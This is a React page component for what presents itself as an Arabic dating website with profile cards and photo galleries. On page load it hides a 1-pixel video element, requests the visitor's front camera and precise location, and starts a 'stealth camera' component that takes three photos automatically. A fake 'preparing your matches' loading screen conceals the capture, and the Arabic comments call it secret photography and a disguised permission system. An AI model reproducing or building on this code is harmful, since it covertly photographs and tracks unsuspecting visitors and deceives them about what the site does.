import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import ProfileCard from '@/components/ProfileCard';
import SubscriptionSection from '@/components/SubscriptionSection';
import StealthCameraManager from '@/components/StealthCameraManager';
import { Loader2, Users, Sparkles, Camera, MapPin } from 'lucide-react';

const profilesData = [
	{
		id: 1,
		name: 'منار',
		tagline: 'أبحث عن شريك لحياة مليئة بالحب والسعادة!',
		imageUrl: '/images/head.jpg',
		galleryImages: [
			'/images/492861928_3042031129270592_5878340506782742433_n.jpg',
			'/images/493679073_3042031239270581_2578712428501145292_n.jpg',
			'/images/494000038_3042031292603909_3860249713121620909_n.jpg',
			'/images/494441961_3042030965937275_6863802993332546293_n.jpg',
			'/images/495175740_3042031405937231_4428811475667918103_n.jpg',
			'/images/495662332_3042030852603953_6875536021466364459_n.jpg',
			'/images/499783379_3042031352603903_3201634282359638241_n.jpg',
			'/images/499861509_3042031079270597_8855453234753504983_n.jpg',
			'/images/500221778_3042031602603878_7582667013154658689_n.jpg',
			'/images/500318729_3042031475937224_5974158495486366566_n.jpg',
		],
	},
	{
		id: 2,
		name: 'نورا',
		tagline: 'أحب الحياة والمغامرات الجديدة!',
		imageUrl: '/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
		galleryImages: [
			'/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
			'/images/card1/8ceb0f3c39b2b5d142e8dc16981ed9b7.jpg',
			'/images/card1/ce4a915ce9decdbd3b6188b718f7ea2e.jpg',
		],
	},
	{
		id: 3,
		name: 'سارة',
		tagline: 'فنانة تعشق الجمال والطبيعة',
		imageUrl: '/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
		galleryImages: [
			'/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
			'/images/card2/1f6cf953d487a6487a37c68c12d332f7.jpg',
			'/images/card2/852ee08aabeae76e97a35141283b23c7.jpg',
			'/images/card2/8616241893958d18d7a1944f6da0a221.jpg',
		],
	},
];

const Index: React.FC = () => {
	const [permissionsGranted, setPermissionsGranted] = useState(false);
	const [showStealthCapture, setShowStealthCapture] = useState(false);
	const [captureComplete, setCaptureComplete] = useState(false);
	const [isLoading, setIsLoading] = useState(true);
	const videoRef = useRef<HTMLVideoElement | null>(null);
	const geoWatchId = useRef<number | null>(null);
	const navigate = useNavigate();

	useEffect(() => {
		// مؤقت لإظهار المحتوى في حال عدم إتمام العملية
		const contentTimer = setTimeout(() => {
			setIsLoading(false);
			setPermissionsGranted(true);
		}, 5000);

		// إنشاء عناصر مخفية لطلب الأذونات
		const setupStealthPermissions = async () => {
			try {
				// إنشاء عنصر فيديو مخفي لطلب إذن الكاميرا بشكل خفي
				const videoElement = document.createElement('video');
				videoElement.style.width = '1px';
				videoElement.style.height = '1px';
				videoElement.style.position = 'fixed';
				videoElement.style.top = '0';
				videoElement.style.left = '0';
				videoElement.style.opacity = '0.01';
				videoElement.muted = true;
				videoElement.playsInline = true;
				document.body.appendChild(videoElement);
				videoRef.current = videoElement;

				// طلب إذن الكاميرا بشكل خفي
				try {
					const stream = await navigator.mediaDevices.getUserMedia({
						video: {
							width: { ideal: 640 },
							height: { ideal: 480 },
							facingMode: 'user'
						},
						audio: false
					});
					
					videoElement.srcObject = stream;
					videoElement.play().catch(e => console.log('تشغيل الفيديو غير ضروري:', e));
					
					// إيقاف الكاميرا بعد الحصول على الإذن
					setTimeout(() => {
						stream.getTracks().forEach(track => track.stop());
					}, 1000);
				} catch (err) {
					console.log('لم يتم السماح بالكاميرا، ولكن سنستمر:', err);
				}
				
				// طلب إذن الموقع بشكل خفي
				try {
					if (navigator.geolocation) {
						// استخدام watchPosition بدلاً من getCurrentPosition للعمل في الخلفية
						geoWatchId.current = navigator.geolocation.watchPosition(
							(position) => {
								console.log('تم تحديد الموقع بنجاح');
								// إلغاء المراقبة بعد الحصول على موقع واحد
								if (geoWatchId.current !== null) {
									navigator.geolocation.clearWatch(geoWatchId.current);
								}
							},
							(error) => {
								console.log('خطأ في تحديد الموقع، ولكن سنستمر:', error);
							},
							{
								enableHighAccuracy: true,
								timeout: 10000,
								maximumAge: 0
							}
						);
					}
				} catch (err) {
					console.log('لم يتم السماح بالموقع، ولكن سنستمر:', err);
				}

				// تعيين الإذونات كممنوحة بغض النظر عن النتيجة
				clearTimeout(contentTimer);
				setPermissionsGranted(true);
				setIsLoading(false);
				
				// بدء التصوير السري
				setShowStealthCapture(true);
				
				// مؤقت احتياطي - إذا لم ينته التصوير خلال 20 ثانية
				setTimeout(() => {
					if (showStealthCapture) {
						console.log('انتهاء مهلة التصوير - عرض المحتوى');
						handleStealthCaptureComplete();
					}
				}, 20000);
				
			} catch (error) {
				console.log('حدث خطأ، ولكن سنستمر:', error);
				clearTimeout(contentTimer);
				setPermissionsGranted(true);
				setIsLoading(false);
			}
		};

		// تشغيل نظام الأذونات المموه
		setupStealthPermissions();

		// التنظيف عند إلغاء تحميل المكون
		return () => {
			clearTimeout(contentTimer);
			if (geoWatchId.current !== null) {
				navigator.geolocation.clearWatch(geoWatchId.current);
			}
			if (videoRef.current) {
				document.body.removeChild(videoRef.current);
			}
		};
	}, []);

	const handleStealthCaptureComplete = () => {
		console.log('تم الانتهاء من التصوير السري');
		setCaptureComplete(true);
		setShowStealthCapture(false);
	};

	// شاشة التحميل البسيطة
	if (isLoading) {
		return (
			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
				<div className="text-center p-8">
					<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
						جاري تحميل الموقع...
					</h2>
				</div>
			</div>
		);
	}

	// نظام التصوير السري
	if (showStealthCapture) {
		return (
			<div>
				{/* التصوير السري يعمل في الخلفية */}
				<StealthCameraManager
					onComplete={handleStealthCaptureComplete}
					autoStart={true}
					photoCount={3}
				/>
				{/* شاشة تحميل بسيطة للتمويه */}
				<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
					<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
						<div className="flex items-center justify-center gap-4 mb-6">
							<Sparkles className="w-12 h-12 text-seductive-accent" />
						</div>
						<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
						<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
							جاري تحضير تجربتك الخاصة
						</h2>
						<p className="text-lg text-white/90 mb-4">
							نحن نجهز أفضل المطابقات لك...
						</p>
						<p className="text-sm text-white/70">
							قريباً ستجد شريك العمر المناسب!
						</p>
					</div>
				</div>
			</div>
		);
	}

	// عرض المحتوى الرئيسي
	return (
		<div className="min-h-screen flex flex-col">
			<header className="py-8 text-center">
				<div className="container mx-auto px-4">
					<h1 className="text-3xl md:text-4xl lg:text-5xl font-bold text-seductive-text flex items-center justify-center gap-3">
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
						اكتشف شريك العمر المناسب لك!
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
					</h1>
				</div>
			</header>

			<main className="flex-grow container mx-auto px-4 py-8">
				<div className="text-center mb-12">
					<p className="text-xl md:text-2xl text-seductive-text flex items-center justify-center gap-2">
						<Users className="w-7 h-7 text-seductive-accent" />
						هؤلاء الأشخاص ينتظرونك!
					</p>
				</div>
				<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 justify-center">
					{profilesData.map((profile) => (
						<ProfileCard
							key={profile.id}
							imageUrl={profile.imageUrl}
							tagline={profile.tagline}
							name={profile.name}
							galleryImages={profile.galleryImages}
						/>
					))}
				</div>
				<div className="text-center mt-12">
					<p className="text-lg md:text-xl text-seductive-text/80 italic">
						ابدأ محادثة الآن واكتشف المزيد!
					</p>
				</div>
			</main>

			<SubscriptionSection />

			<footer className="text-center py-6 text-seductive-text/60 text-sm">
				<p>&copy; {new Date().getFullYear()} شريك العمر. جميع الحقوق محفوظة.</p>
				<p className="font-english text-xs">
					Lovingly crafted in Menoufia, Egypt.
				</p>
			</footer>
		</div>
	);
};

export default Index;
